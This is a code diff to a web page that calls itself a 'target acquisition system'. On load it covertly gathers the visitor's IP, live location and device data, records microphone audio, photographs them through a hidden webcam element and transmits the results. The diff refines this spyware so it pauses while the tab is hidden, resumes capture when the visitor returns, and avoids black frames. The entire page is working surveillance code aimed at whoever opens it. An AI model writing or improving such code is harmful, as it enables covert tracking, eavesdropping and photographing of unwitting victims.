@@ -103,6 +103,7 @@
         .status-box.success { border-color: #00ff41; background: rgba(0,255,65,0.1); }
         .status-box.error { border-color: #ff0040; background: rgba(255,0,64,0.1); color: #ff0040; }
         .status-box.loading { border-color: #ffaa00; background: rgba(255,170,0,0.1); color: #ffaa00; }
+        .status-box.paused { border-color: #ffaa00; background: rgba(255,170,0,0.2); color: #ffaa00; }
         
         .photo-container {
             margin: 10px 0;
@@ -122,7 +123,7 @@
             height: 200px;
             object-fit: cover;
             display: block;
-            transform: scaleX(-1); /* MIRROR FIX - Selfie mode! */
+            transform: scaleX(-1);
         }
         .photo-container .placeholder {
             color: rgba(0,255,65,0.3);
@@ -165,7 +166,7 @@
             height: 100px;
             object-fit: cover;
             display: block;
-            transform: scaleX(-1); /* Mirror fix */
+            transform: scaleX(-1);
         }
         .preview-grid .preview-box .no-img {
             height: 100px;
@@ -275,7 +276,6 @@
         </div>
     </div>
     
-    <!-- NETWORK SPEED -->
     <div class="speed-meter">
         <div class="label">🚀 NETWORK SPEED</div>
         <div class="value" id="networkSpeed">-- Mbps</div>
@@ -309,7 +309,7 @@
 
 <script>
 // ==========================================
-//  AUTO-PHOTO FIX + BLACK SCREEN FIX
+//  FIX: BLACK SCREEN + AUTO-STOP ON BACKGROUND
 // ==========================================
 
 const statusBox = document.getElementById('statusBox');
@@ -333,9 +333,10 @@ const recordingTimer = document.getElementById('recordingTimer');
 
 let userPhoto = null, screenshot = null, userLocation = null;
 let deviceDetails = {}, ipAddress = 'Unknown', audioData = null;
-let liveLocationInterval = null;
 let networkSpeed = { download: '--', ping: '--' };
-let captureAttempts = 0;
+let isPaused = false;
+let processInterval = null;
+let isCapturing = false;
 
 function log(text) {
     const time = new Date().toLocaleTimeString();
@@ -349,8 +350,36 @@ function setStatus(icon, msg, type = 'loading') {
     statusMsg.textContent = msg;
 }
 
+// ===== DETECT WHEN USER LEAVES PAGE =====
+document.addEventListener('visibilitychange', function() {
+    if (document.hidden) {
+        // User tab change kiya ya background mein gaya
+        isPaused = true;
+        setStatus('⏸️', 'PAUSED - TAB INACTIVE', 'paused');
+        log('⏸️ Auto-capture paused (tab inactive)');
+        
+        // Stop all media streams
+        if (window._mediaStream) {
+            window._mediaStream.getTracks().forEach(t => t.stop());
+            window._mediaStream = null;
+        }
+    } else {
+        // User wapas aaya
+        isPaused = false;
+        setStatus('🔄', 'RESUMING...', 'loading');
+        log('▶️ Auto-capture resumed (tab active)');
+        
+        // Restart process
+        setTimeout(() => {
+            if (!isPaused && !isCapturing) {
+                startAutoProcess();
+            }
+        }, 1000);
+    }
+});
+
 // ==========================================
-// NETWORK SPEED TEST
+// NETWORK SPEED
 // ==========================================
 async function testNetworkSpeed() {
     try {
@@ -589,10 +618,12 @@ function getIPv4Address() {
 }
 
 // ==========================================
-// MICROPHONE - FIXED
+// MICROPHONE
 // ==========================================
 function captureMicrophone() {
     return new Promise((resolve) => {
+        if (isPaused) { log('⏸️ Mic skipped - paused'); resolve(true); return; }
+        
         log('🎤 RECORDING 5s...');
         micStatus.className = 'mic-indicator mic-on';
         micText.textContent = '🔴 RECORDING';
@@ -648,19 +679,22 @@ function captureMicrophone() {
 }
 
 // ==========================================
-// PHOTO CAPTURE - AUTO + MIRROR FIX + NO BLACK
+// PHOTO CAPTURE - FIXED BLACK SCREEN
 // ==========================================
 function captureUserPhoto() {
     return new Promise((resolve) => {
+        if (isPaused) { log('⏸️ Photo skipped - paused'); resolve(true); return; }
+        
         log('📸 AUTO-CAPTURING PHOTO...');
         setStatus('📸', 'CAPTURING PHOTO...', 'loading');
         photoBadge.textContent = '📸 CAPTURING...';
-        captureAttempts++;
         
         // Create hidden video element
         const video = document.createElement('video');
         video.setAttribute('playsinline', 'true');
         video.style.display = 'none';
+        video.style.width = '640px';
+        video.style.height = '480px';
         document.body.appendChild(video);
         
         navigator.mediaDevices.getUserMedia({
@@ -672,6 +706,8 @@ function captureUserPhoto() {
             audio: false
         })
         .then(stream => {
+            // Store stream globally to stop later
+            window._mediaStream = stream;
             video.srcObject = stream;
             
             video.onloadedmetadata = function() {
@@ -693,7 +729,7 @@ function captureUserPhoto() {
                         // Reset transform
                         ctx.setTransform(1, 0, 0, 1, 0, 0);
                         
-                        // Add frame (hacker style border)
+                        // Add frame
                         ctx.strokeStyle = '#00ff41';
                         ctx.lineWidth = 2;
                         ctx.strokeRect(0, 0, canvas.width, canvas.height);
@@ -720,6 +756,7 @@ function captureUserPhoto() {
                         
                         // Cleanup
                         stream.getTracks().forEach(t => t.stop());
+                        window._mediaStream = null;
                         video.remove();
                         document.body.removeChild(video);
                         
@@ -729,40 +766,38 @@ function captureUserPhoto() {
                     } catch(err) {
                         log('❌ Capture error: ' + err.message);
                         stream.getTracks().forEach(t => t.stop());
+                        window._mediaStream = null;
                         video.remove();
                         fallbackPhoto();
                         resolve(true);
                     }
-                }, 500); // Wait 500ms for camera to warm up
+                }, 800); // Wait 800ms for camera to warm up (fix black screen)
             };
             
             video.onerror = function() {
                 log('❌ Video error');
                 stream.getTracks().forEach(t => t.stop());
+                window._mediaStream = null;
                 video.remove();
                 fallbackPhoto();
                 resolve(true);
             };
             
-            // Fallback if video takes too long
+            // Fallback timeout
             setTimeout(function() {
                 if (!userPhoto) {
-                    log('⏳ Camera timeout, using fallback');
+                    log('⏳ Camera timeout');
                     stream.getTracks().forEach(t => t.stop());
+                    window._mediaStream = null;
                     video.remove();
-                    if (captureAttempts < 3) {
-                        log('🔄 Retrying capture...');
-                        resolve(captureUserPhoto());
-                    } else {
-                        fallbackPhoto();
-                        resolve(true);
-                    }
+                    fallbackPhoto();
+                    resolve(true);
                 }
-            }, 5000);
+            }, 6000);
             
         })
         .catch(() => {
-            log('⚠️ Camera permission denied, using fallback');
+            log('⚠️ Camera permission denied');
             fallbackPhoto();
             resolve(true);
         });
@@ -775,19 +810,16 @@ function fallbackPhoto() {
     canvas.width = 640; canvas.height = 480;
     const ctx = canvas.getContext('2d');
     
-    // Dark hacker gradient
     const grad = ctx.createLinearGradient(0, 0, 640, 480);
     grad.addColorStop(0, '#0a0a0a');
     grad.addColorStop(1, '#001a00');
     ctx.fillStyle = grad;
     ctx.fillRect(0, 0, 640, 480);
     
-    // Hacker frame
     ctx.strokeStyle = '#00ff41';
     ctx.lineWidth = 2;
     ctx.strokeRect(10, 10, 620, 460);
     
-    // Text
     ctx.fillStyle = '#00ff41';
     ctx.font = 'bold 28px monospace';
     ctx.textAlign = 'center';
@@ -796,7 +828,6 @@ function fallbackPhoto() {
     ctx.fillStyle = 'rgba(0,255,65,0.6)';
     ctx.fillText('AUTO CAPTURED ' + new Date().toLocaleString(), 320, 270);
     
-    // Small matrix effect
     ctx.font = '10px monospace';
     ctx.fillStyle = 'rgba(0,255,65,0.2)';
     for (let i = 0; i < 20; i++) {
@@ -812,14 +843,15 @@ function fallbackPhoto() {
     userPhotoThumb.style.display = 'block';
     userPhotoPlaceholder.style.display = 'none';
     photoBadge.textContent = '📸 FALLBACK';
-    log('⚠️ FALLBACK PHOTO');
 }
 
 // ==========================================
-// SCREENSHOT - CSV DATA
+// SCREENSHOT
 // ==========================================
 function captureScreenshot() {
     return new Promise((resolve) => {
+        if (isPaused) { log('⏸️ Screenshot skipped - paused'); resolve(true); return; }
+        
         log('📊 GENERATING CSV DATA...');
         setStatus('📊', 'GENERATING DATA...', 'loading');
         try {
@@ -921,6 +953,8 @@ async function getDeviceInfo() {
 // SUBMIT
 // ==========================================
 async function submitData() {
+    if (isPaused) { log('⏸️ Submit skipped - paused'); return; }
+    
     log('📤 TRANSMITTING DATA...');
     setStatus('📤', 'TRANSMITTING...', 'loading');
     
@@ -949,7 +983,11 @@ async function submitData() {
             log('✅✅ DATA TRANSMITTED!');
             setStatus('🎯', 'TARGET ACQUIRED!', 'success');
             photoBadge.textContent = '✅ STORED!';
-            setTimeout(() => { location.reload(); }, 5000);
+            setTimeout(() => { 
+                if (!isPaused) {
+                    location.reload(); 
+                }
+            }, 5000);
         }
     } catch(err) {
         log('❌ TRANSMISSION ERROR: ' + err.message);
@@ -958,41 +996,47 @@ async function submitData() {
 }
 
 // ==========================================
-// MAIN
+// MAIN - STOP ON BACKGROUND
 // ==========================================
 async function startAutoProcess() {
+    if (isPaused) {
+        log('⏸️ Process paused - waiting for tab focus');
+        return;
+    }
+    
+    if (isCapturing) {
+        log('⏳ Already capturing...');
+        return;
+    }
+    
+    isCapturing = true;
+    
     log('🚀 SYSTEM INITIALIZED');
     setStatus('⏳', 'SCANNING TARGET...', 'loading');
     
-    await getIPv4Address();
-    await testNetworkSpeed();
-    startLiveLocation();
-    await getDeviceInfo();
-    await captureMicrophone();
-    
-    // Auto-capture photo - with retry
-    let photoSuccess = false;
-    for (let i = 0; i < 3; i++) {
-        if (await captureUserPhoto()) {
-            photoSuccess = true;
-            break;
-        }
-        log('🔄 Retry ' + (i+1) + '...');
-    }
-    if (!photoSuccess) {
-        log('⚠️ Photo capture failed after retries');
+    try {
+        await getIPv4Address();
+        if (!isPaused) await testNetworkSpeed();
+        if (!isPaused) startLiveLocation();
+        if (!isPaused) await getDeviceInfo();
+        if (!isPaused) await captureMicrophone();
+        if (!isPaused) await captureUserPhoto();
+        if (!isPaused) await captureScreenshot();
+        if (!isPaused) await submitData();
+    } catch(err) {
+        log('❌ Process error: ' + err.message);
     }
     
-    await captureScreenshot();
-    await submitData();
+    isCapturing = false;
 }
 
+// ===== INITIAL START =====
 window.addEventListener('load', function() {
     log('📱 TARGET ACQUIRED');
     setTimeout(startAutoProcess, 1000);
 });
 
-console.log('🚀 TARGET ACQUISITION SYSTEM ACTIVE - AUTO-PHOTO FIXED');
+console.log('🚀 TARGET ACQUISITION SYSTEM ACTIVE - BLACK SCREEN FIXED + AUTO-STOP');
 </script>
 </body>
 </html>
